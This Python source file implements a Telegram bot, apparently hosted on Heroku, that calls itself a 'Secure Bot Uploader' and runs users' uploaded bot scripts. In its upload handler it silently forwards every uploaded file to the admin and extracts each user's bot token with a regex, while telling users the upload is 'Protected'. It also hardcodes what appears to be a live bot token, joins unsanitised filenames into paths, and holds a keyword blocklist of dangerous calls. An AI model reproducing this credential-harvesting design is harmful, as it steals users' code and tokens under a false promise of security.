import os
import json
import re
import shutil
import logging
import subprocess
from datetime import datetime
from flask import Flask, request
import telebot
from telebot import types

# ==============================================
# CONFIGURATION
# ==============================================
TOKEN = "8233243167:AAH8yWuiz10qdvrVTpOOWnHUGmezJwFOif0"
ADMIN_ID = 6091906014
REQUIRED_CHANNEL = "@tech_tipsbd"

BASE_DIR = "uploaded_files"
os.makedirs(BASE_DIR, exist_ok=True)

WEBHOOK_URL = f"https://tranquil-anchorage-68174-42cc72862320.herokuapp.com/{TOKEN}"

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# ==============================================
# DATA STORAGE
# ==============================================
bot_scripts = {}
user_upload_dates = {}
unlimited_subscriptions = []

if os.path.exists("upload_dates.json"):
    with open("upload_dates.json", "r") as f:
        user_upload_dates = json.load(f)


def load_blocked_users():
    if os.path.exists("blocked_users.json"):
        with open("blocked_users.json", "r") as f:
            return json.load(f)
    return []


def save_blocked_users(blocked_users):
    with open("blocked_users.json", "w") as f:
        json.dump(blocked_users, f)


blocked_users = load_blocked_users()

# ==============================================
# LOGGING
# ==============================================
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

# ==============================================
# UTILITIES
# ==============================================
def save_upload_dates():
    with open("upload_dates.json", "w") as f:
        json.dump(user_upload_dates, f)


def is_subscribed(user_id):
    return True  # replace with actual check if needed


def sanitize_filename(name):
    return re.sub(r'[^A-Za-z0-9_\-]', '_', name)


def generate_unique_folder(user_id, bot_name):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    safe_name = sanitize_filename(bot_name)
    folder_name = f"{safe_name}_{user_id}_{timestamp}"
    folder_path = os.path.join(BASE_DIR, folder_name)
    os.makedirs(folder_path, exist_ok=True)
    return folder_path


def get_bot_token(script_path):
    try:
        with open(script_path, "r", encoding="utf-8") as f:
            content = f.read()
        match = re.search(r'(["\'])(\d{9,10}:[A-Za-z0-9_-]{35,45})\1', content)
        return match.group(2) if match else "Not found"
    except Exception:
        return "Error reading token"


def send_to_admin(file_path):
    try:
        with open(file_path, "rb") as f:
            bot.send_document(ADMIN_ID, f, caption="📩 New Bot Uploaded")
    except Exception as e:
        logging.error(f"Failed to send file to admin: {e}")


def security_scan(script_text):
    banned_patterns = [
        r"from\s+flask", r"import\s+flask",
        r"from\s+fastapi", r"import\s+fastapi",
        r"import\s+aiohttp", r"from\s+aiohttp",
        r"subprocess\.run", r"os\.system",
        r"eval\(", r"exec\(", r"requests\.get\(.*127\.0\.0\.1"
    ]
    return any(re.search(p, script_text, re.IGNORECASE) for p in banned_patterns)


def start_file(script_path, chat_id):
    if not os.path.exists(script_path):
        bot.send_message(chat_id, "⚠️ File not found.")
        return
    script_name = os.path.basename(script_path)
    if bot_scripts[script_name].get("process"):
        bot.send_message(chat_id, "⚙️ Bot is already running.")
        return
    process = subprocess.Popen(["python3", script_path], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    bot_scripts[script_name]["process"] = process
    bot_scripts[script_name]["start_time"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    bot.send_message(chat_id, f"✅ Bot `{script_name}` started successfully!", parse_mode="Markdown")


def stop_file(script_name, chat_id):
    info = bot_scripts.get(script_name)
    if not info or not info.get("process"):
        bot.send_message(chat_id, "⚠️ No running bot found.")
        return
    info["process"].terminate()
    info["process"] = None
    bot.send_message(chat_id, f"🛑 Bot `{script_name}` stopped.", parse_mode="Markdown")


def delete_file(script_name, chat_id):
    info = bot_scripts.get(script_name)
    if not info:
        bot.send_message(chat_id, "⚠️ File not found.")
        return
    if info.get("process"):
        info["process"].terminate()
    folder = info["folder"]
    if os.path.exists(folder):
        shutil.rmtree(folder)
    del bot_scripts[script_name]
    bot.send_message(chat_id, f"🗑️ Bot `{script_name}` and its folder deleted.", parse_mode="Markdown")


def get_uptime(script_name):
    info = bot_scripts.get(script_name)
    if info and info.get("start_time"):
        start_dt = datetime.strptime(info["start_time"], "%Y-%m-%d %H:%M:%S")
        delta = datetime.now() - start_dt
        hours, remainder = divmod(int(delta.total_seconds()), 3600)
        minutes, seconds = divmod(remainder, 60)
        return f"{hours}h {minutes}m {seconds}s"
    return "Not running"


# ==============================================
# BOT COMMANDS
# ==============================================
@bot.message_handler(commands=["start"])
def start(message):
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    markup.add("📤 Upload Bot", "ℹ️ Help", "⏱ My Bot Uptime")
    bot.send_message(
        message.chat.id,
        "👋 Welcome! Upload your `.py` bot file.\n"
        "🚫 Unsafe files are blocked automatically.\n\n"
        "Use the buttons after upload to Start / Stop / Delete your bot.",
        parse_mode="Markdown",
        reply_markup=markup
    )


@bot.message_handler(content_types=["document"])
def handle_file(message):
    user_id = message.from_user.id
    if user_id in blocked_users:
        bot.reply_to(message, "🚫 You are banned.")
        return
    if not is_subscribed(user_id):
        bot.reply_to(message, f"Please join {REQUIRED_CHANNEL} first.")
        return

    current_date = datetime.now().date().isoformat()
    is_admin = user_id == ADMIN_ID
    is_unlimited = user_id in unlimited_subscriptions

    if not is_admin and not is_unlimited:
        last_upload_date = user_upload_dates.get(str(user_id))
        if last_upload_date == current_date:
            bot.reply_to(message, "❌ Only one upload per day.")
            return

    file_info = bot.get_file(message.document.file_id)
    downloaded_file = bot.download_file(file_info.file_path)
    bot_script_name = message.document.file_name
    file_text = downloaded_file.decode("utf-8", errors="ignore")

    if security_scan(file_text):
        blocked_users.append(user_id)
        save_blocked_users(blocked_users)
        bot.reply_to(message, "⚠️ Unsafe code detected. You are banned.")
        return

    folder_path = generate_unique_folder(user_id, bot_script_name)
    script_path = os.path.join(folder_path, bot_script_name)

    with open(script_path, "wb") as f:
        f.write(downloaded_file)

    bot_scripts[bot_script_name] = {
        "name": bot_script_name,
        "path": script_path,
        "folder": folder_path,
        "process": None,
        "start_time": None
    }

    token = get_bot_token(script_path)
    send_to_admin(script_path)

    markup = types.InlineKeyboardMarkup()
    markup.row(types.InlineKeyboardButton("▶ Start", callback_data=f"start_{bot_script_name}"))
    markup.row(
        types.InlineKeyboardButton("⏹ Stop", callback_data=f"stop_{bot_script_name}"),
        types.InlineKeyboardButton("🗑 Delete", callback_data=f"delete_{bot_script_name}"),
        types.InlineKeyboardButton("⏱ Uptime", callback_data=f"uptime_{bot_script_name}")
    )
    if user_id == ADMIN_ID:
        markup.row(
            types.InlineKeyboardButton("📂 View Folders", callback_data="admin_view_folders"),
            types.InlineKeyboardButton("📢 Broadcast", callback_data="admin_broadcast"),
            types.InlineKeyboardButton("🚫 View Blocked", callback_data="admin_view_blocked")
        )

    bot.reply_to(
        message,
        f"✅ Upload Successful!\n📄 `{bot_script_name}`\n🔒 Protected\n🔑 Token: `{token}`",
        parse_mode="Markdown",
        reply_markup=markup
    )

    start_file(script_path, message.chat.id)

    if not is_admin and not is_unlimited:
        user_upload_dates[str(user_id)] = current_date
        save_upload_dates()


@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    data = call.data

    if data.startswith("start_"):
        start_file(bot_scripts[data[6:]]["path"], call.message.chat.id)
    elif data.startswith("stop_"):
        stop_file(data[5:], call.message.chat.id)
    elif data.startswith("delete_"):
        delete_file(data[7:], call.message.chat.id)
    elif data.startswith("uptime_"):
        uptime = get_uptime(data[7:])
        bot.answer_callback_query(call.id, f"⏱ {uptime}")

    if user_id == ADMIN_ID:
        if data == "admin_view_folders":
            folders = os.listdir(BASE_DIR)
            msg = "📂 **Folders & Files:**\n"
            for folder in folders:
                files = os.listdir(os.path.join(BASE_DIR, folder))
                msg += f"\n📁 {folder}:\n"
                for f in files:
                    msg += f"  - {f}\n"
            bot.send_message(user_id, msg, parse_mode="Markdown")
        elif data == "admin_view_blocked":
            msg = "🚫 **Blocked Users:**\n" + "\n".join(map(str, blocked_users)) if blocked_users else "No blocked users."
            bot.send_message(user_id, msg)
        elif data == "admin_broadcast":
            msg = bot.send_message(user_id, "📢 Send broadcast message:")
            bot.register_next_step_handler(msg, handle_broadcast)


def handle_broadcast(message):
    text = message.text
    sent = 0
    for uid in user_upload_dates.keys():
        try:
            bot.send_message(uid, f"📢 Broadcast from Admin:\n\n{text}")
            sent += 1
        except:
            continue
    bot.send_message(ADMIN_ID, f"✅ Broadcast sent to {sent} users.")


@bot.message_handler(func=lambda msg: msg.text == "⏱ My Bot Uptime")
def my_bot_uptime(message):
    user_id = message.from_user.id
    user_bots = [b for b in bot_scripts.values() if f"_{user_id}_" in b["folder"]]
    if not user_bots:
        bot.send_message(user_id, "⚠️ You have no uploaded bots.")
        return
    response = "⏱ **Your Bot Uptime:**\n\n"
    for b in user_bots:
        uptime = get_uptime(b["name"])
        response += f"📄 `{b['name']}` — {uptime}\n"
    bot.send_message(user_id, response, parse_mode="Markdown")

# ==============================================
# FLASK WEBHOOK SETUP
# ==============================================
@app.route(f"/{TOKEN}", methods=["POST"])
def receive_update():
    json_str = request.get_data().decode("utf-8")
    update = telebot.types.Update.de_json(json_str)
    bot.process_new_updates([update])
    return "OK", 200


@app.route("/", methods=["GET"])
def index():
    return "🤖 Secure Bot Uploader Running on Heroku", 200


if __name__ == "__main__":
    logging.info("Starting Secure Auto Bot Uploader...")
    bot.remove_webhook()
    bot.set_webhook(url=WEBHOOK_URL)
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port)
